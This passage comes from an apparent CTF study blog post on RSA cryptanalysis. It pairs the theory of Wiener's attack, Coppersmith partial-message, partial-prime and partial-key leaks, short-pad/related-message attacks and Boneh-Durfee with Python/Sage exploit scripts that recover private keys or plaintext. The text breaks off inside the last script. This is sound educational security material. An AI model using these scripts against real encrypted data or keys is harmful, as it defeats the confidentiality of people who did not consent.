class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="RSA-Wiener’s-Attack"><a href="#RSA-Wiener’s-Attack" class="headerlink" title="RSA - Wiener’s Attack"></a>RSA - Wiener’s Attack</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h4><script type="math/tex; mode=display">Let \ N=pq\ with\ q<p<2q. Let\ d<\frac{1}{3}N^{\frac{1}{4}}.\\\\Known (N,e),we\ can\ use\ Wiener's\ attack.\\\\</script><hr><p>$Since\ ed\equiv 1(mod\ \varphi(N)),\exists k\in N,s.t.\ ed=k\varphi(N)+1\Rightarrow\left|\frac{e}{\varphi(N)}-\frac{k}{d}\right|=1.$<br>From q&lt;p&lt;2q, it follows $\sqrt{N}&lt;p&lt;\sqrt{2N}$, hence<br>$N-\varphi(N)=p+q-1=p+\frac{N}{p}-1&lt;\frac{3\sqrt{2}}{2}\sqrt{N}&lt;3\sqrt{N}$<br>$\therefore\left|\frac{e}{N}-\frac{k}{d}\right|=\left|\frac{ed-k\varphi(N)+k\varphi(N)-kN}{Nd}\right|=\left|\frac{1+k(\varphi(N)-N)}{Nd}\right|\leq\left|\frac{3k\sqrt{N}}{Nd}\right|=\left|\frac{3k}{\sqrt{N}d}\right|$<br>$\because k\varphi(N)=ed-1&lt;ed,\ e&lt;\varphi(N)\quad \therefore k\varphi(N)&lt;d\varphi(N)\rightarrow k&lt;d&lt;\frac{1}{3}N^{\frac{1}{4}}$<br>$\therefore\left|\frac{e}{N}-\frac{k}{d}\right|\leq\left|\frac{3k}{\sqrt{N}d}\right|&lt;\left|\frac{3k}{\sqrt{N}d}\right|&lt;\frac{1}{3d\cdot d}&lt;\frac{1}{2d^2}$</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/image-20200122234635721.png" alt></p><p>Therefore,we can get $\frac{k}{d}$ from the convergents of $\frac{e}{N}$.</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_quotients</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    a = x // y</span><br><span class="line">    quotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        quotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> quotients</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_quotients</span><span class="params">(quotients)</span>:</span></span><br><span class="line">    convergents = [(quotients[<span class="number">0</span>], <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, len(quotients) + <span class="number">1</span>):</span><br><span class="line">        quotients_partion = quotients[<span class="number">0</span>:i]</span><br><span class="line">        denom = quotients_partion[<span class="number">-1</span>]  <span class="comment"># 分母</span></span><br><span class="line">        num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">-2</span>, -len(quotients_partion), <span class="number">-1</span>):</span><br><span class="line">            num, denom = denom, quotients_partion[_] * denom + num</span><br><span class="line">        num += denom * quotients_partion[<span class="number">0</span>]</span><br><span class="line">        convergents.append((num, denom))</span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WienerAttack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    quotients = rational_to_quotients(e, n)</span><br><span class="line">    convergents = convergents_from_quotients(quotients)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">and</span> <span class="keyword">not</span> (e * d - <span class="number">1</span>) % k:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            <span class="comment"># check if (x^2 - coef * x + n = 0) has integer roots</span></span><br><span class="line">            coef = n - phi + <span class="number">1</span></span><br><span class="line">            delta = coef * coef - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> delta &gt; <span class="number">0</span> <span class="keyword">and</span> gmpy2.iroot(delta, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">                print(<span class="string">'d = '</span> + str(d))</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    e = int(input(<span class="string">"e = "</span>))</span><br><span class="line">    n = int(input(<span class="string">"n = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = WienerAttack(e, n)</span><br><span class="line">    plaintext = long_to_bytes(pow(c, d, n))</span><br><span class="line">    print(plaintext)</span><br></pre></td></tr></table></figure><h3 id="RSA-Partial-m"><a href="#RSA-Partial-m" class="headerlink" title="RSA - Partial_m"></a>RSA - Partial_m</h3><h4 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="Theorem"></a>Theorem</h4><p>求解一元同余方程的问题可以这样来表达：给定一个未知分解的合数N，b是N的一个因子（注意b是合数），且对一个已知的$\beta(0&lt;\beta&lt;1)$，满足$b\geq N^{\beta}$。给定一个度数为$\delta$，首1的单变量多项式$f_{b}(x)\in Z[X]$，在$\delta$和N的比特长度的多项式函数时间内找到所有$b|f_{b}(x)$的满足$|x_{0}|\leq X$的根$x_{0}\in Z$，X是$x_{0}$的上界。目标是通过尽可能宽松的界X获得更大的解出x的可能性。</p><p><strong>定理1</strong> (Coppersmith 96)：$N,b,\beta,f,\delta$定义同上。此时我们可以在$O(c\delta^{5}log^{9}N)$内得到满足条件：</p><p>$|x_{0}|\leq \frac{1}{2}N^{\frac{\beta^{2}}{\delta}-\epsilon}$</p><p>的，一元同余方程f(x)=0 mod b的解 ($\epsilon$多取$\frac{\beta}{7}$, 证明略)</p><p><strong>定理2</strong> (CopperSmith 96[2])：定理1在N=b时的特殊情况，可以在(log N,$\delta$)的多项式时间内求出所有满足：</p><p>$|x_{0}|\leq N^{\frac{1}{\delta}}$</p><p>的模等式$f_{N}(x)=0\ mod\ N$的解</p><p>$\therefore$ e足够小，且部分明文泄露时，可以采用coppersmith单变量模等式的攻击，如下：</p><p>$c:=m^{e}\ mod\ n=(mbar+x_{0})^{e}\ mod\ n$ , (mbar = (m &gt;&gt; kbits) &lt;&lt; kbits)</p><p>定理2知，$|x_{0}|\leq N^{\frac{1}{e}}$时，可以在logN和e的多项式时间内求出x</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">mbar = </span><br><span class="line">kbits = </span><br><span class="line"></span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">print(<span class="string">"upper &#123;&#125; bits of &#123;&#125; bits is given"</span>.format(nbits - kbits, nbits))</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line">print(<span class="string">"m:"</span>, mbar + x0)</span><br></pre></td></tr></table></figure><h4 id="Note-1"><a href="#Note-1" class="headerlink" title="Note"></a>Note</h4><p>m高位泄露是coppersmith的原版结论，实际上可以扩展到高位/低位/高低位泄露的一般情况</p><p>$m=M+x_{0}\cdot 2^{k}+M’$</p><p>$f_{n}(x):=(M+x_{0}\cdot 2^{k}+M’)^{e}-c$</p><p>化为首1即可sage求解（只要未知明文$|x_{0}|\leq N^{\frac{1}{e}}$）</p><h3 id="RSA-Partial-p"><a href="#RSA-Partial-p" class="headerlink" title="RSA - Partial_p"></a>RSA - Partial_p</h3><h4 id="Theorem-5"><a href="#Theorem-5" class="headerlink" title="Theorem"></a>Theorem</h4><p><strong>定理3</strong> (Coppersmith: kp高位比特)：$p&gt;q,k\in N^{*},q\nmid k$，如果对于kp的一个估计值$\widetilde{p}$满足$|kp-\widetilde{p}|\leq 2N^{\frac{1}{4}}$</p><p>那么在多项式时间内可以得到N的分解</p><p>Proof：</p><p>$f_{p}(x):=x+\widetilde{p}$的一个解$x_{0}=(kp-\widetilde{p})\ mod\ p$ 满足$x_{0}\leq 2N^{\frac{1}{4}}$。该多项式首1，且$p\geq N^{\frac{1}{2}}$，由定理1知该方程有解 </p><p>往一般形式上推广，发现p的低位比特泄露也能使用coppersmith攻击，化为首1即可，可类比partial_m的扩展形式</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">pbar = </span><br><span class="line">kbits = </span><br><span class="line"></span><br><span class="line">print(<span class="string">"upper %d bits (of %d bits) is given"</span> % (pbar.nbits()-kbits, pbar.nbits()))</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">p = x0 + pbar</span><br><span class="line">print(<span class="string">"p:"</span>, p)</span><br><span class="line">q = n // int(p)</span><br><span class="line">d = inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">"m:"</span>, pow(c, d, n))</span><br></pre></td></tr></table></figure><h4 id="Note-2"><a href="#Note-2" class="headerlink" title="Note"></a>Note</h4><p>sage的small_root传参X不能过大，需自行判断阈值并调整（如果X过大，即使存在X内的解，也无法求出）</p><p>比如p的低位泄露时因为不确定缺失高位的具体比特数，所以要在$2^{\frac{n.nbits()}{2}-kbits}$附近作X的阈值估计</p><p>无法确定拿到的p是否大于q，所以对$\beta=0.5$进行调整至0.4</p><h3 id="RSA-Partial-d"><a href="#RSA-Partial-d" class="headerlink" title="RSA - Partial_d"></a>RSA - Partial_d</h3><h4 id="Theorem-6"><a href="#Theorem-6" class="headerlink" title="Theorem"></a>Theorem</h4><p>Given the $\frac{n.nbits()}{4}$ least significant bits of d，we can compute all of d in polynomial time in n and e.</p><p>Proof：</p><p>$s \leftarrow p+q$，$ed=1+k\phi (n)=1+k(n-s+1)$</p><p>$\therefore ed_{0}\equiv 1+k(n-s+1)\ mod\ 2^{\frac{n}{4}}\quad (1)$</p><p>$\because p^{2}-sp+n\equiv 0\ mod\ 2^{\frac{n}{4}}\quad (2)$</p><p>$\therefore p\cdot(1),k\cdot(2)\rightarrow ed_{0}p\equiv p+kpn-kp^{2}-kn+kp\ mod\ 2^{\frac{n}{4}}\quad (2)$</p><p>$\therefore$解一元同余方程$ed_{0}x-kx(n-x+1)+kn\equiv x\ (mod\ 2^{d_{0}.nbits()})$即可得到p的部分低位$p_{0}$</p><p>问题转化为partial_p</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.4</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">and</span> p != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    c = </span><br><span class="line">    d0 = </span><br><span class="line">    beta = <span class="number">0.5</span></span><br><span class="line">    </span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = d0.nbits()</span><br><span class="line">    print(<span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits))</span><br><span class="line"></span><br><span class="line">    p = int(find_p(d0, kbits, e, n))</span><br><span class="line">    print(<span class="string">"found p: %d"</span> % p)</span><br><span class="line">    q = n//int(p)</span><br><span class="line">    print(<span class="string">"d:"</span>, inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure><h3 id="RSA-Short-Pad-Attack-amp-Related-Message-Attack"><a href="#RSA-Short-Pad-Attack-amp-Related-Message-Attack" class="headerlink" title="RSA - Short Pad Attack &amp; Related Message Attack"></a>RSA - Short Pad Attack &amp; Related Message Attack</h3><h4 id="Theorem-7"><a href="#Theorem-7" class="headerlink" title="Theorem"></a>Theorem</h4><p>当padding长度$m\in (0,\lfloor\frac{n.nbits()}{e^{2}}\rfloor]$时，$g_{1}=x^{e}-c_{1},g_{2} = (x+y)^{e}-c_{2}$，可以先用结式求解上述二元高次方程组</p><p><strong>定理4</strong>：如果$(x_{0},y_{0})$是方程组<script type="math/tex">\left\{\begin{aligned}f(x,y)=0\\\\g(x,y)=0\end{aligned}\right.</script>的解，则$y_{0}$是$Res_{x}(f,g)$的一个根</p><p>sage里可以用resultant来实现结式计算，$g_{1}.resultant(g_{2})$默认将结式以第二个变量来表示，也可以指定$g_{1}.resultant(g_{2},y)$来将结式以x表示</p><p>求出y后，采用Related Message Attack，简要概括就是求解$gcd(g_{1},g_{2})$，如果结果是线性的，则攻击成功($x=-gcd(g_{1}, g_{2})[0]$)</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span><span class="params">(c1, c2, e, n)</span>:</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line"></span><br><span class="line">    c1 =</span><br><span class="line">    c2 = </span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    print(<span class="string">"difference of two messages is %d"</span> % diff)</span><br><span class="line"></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    print(<span class="string">"m1:"</span>, m1)</span><br><span class="line">    print(<span class="string">"m2:"</span>, m1 + diff)</span><br></pre></td></tr></table></figure><h4 id="Note-3"><a href="#Note-3" class="headerlink" title="Note"></a>Note</h4><p>exp的change_ring缺失即报错，但同环下转换的具体原因，估计要翻sage手册orz</p><h3 id="RSA-Boneh-Durfee-Attack"><a href="#RSA-Boneh-Durfee-Attack" class="headerlink" title="RSA - Boneh Durfee Attack"></a>RSA - Boneh Durfee Attack</h3><h4 id="Theorem-8"><a href="#Theorem-8" class="headerlink" title="Theorem"></a>Theorem</h4><p>比维纳攻击强度更高的小私钥攻击</p><p>引用ctf-wiki上的简略推导过程：</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/image-20200218203256633.png" alt></p><p>后续应该用到了coppersmith对于多元模等式的攻击（坑有点儿深，具体证明略）</p><h4 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span 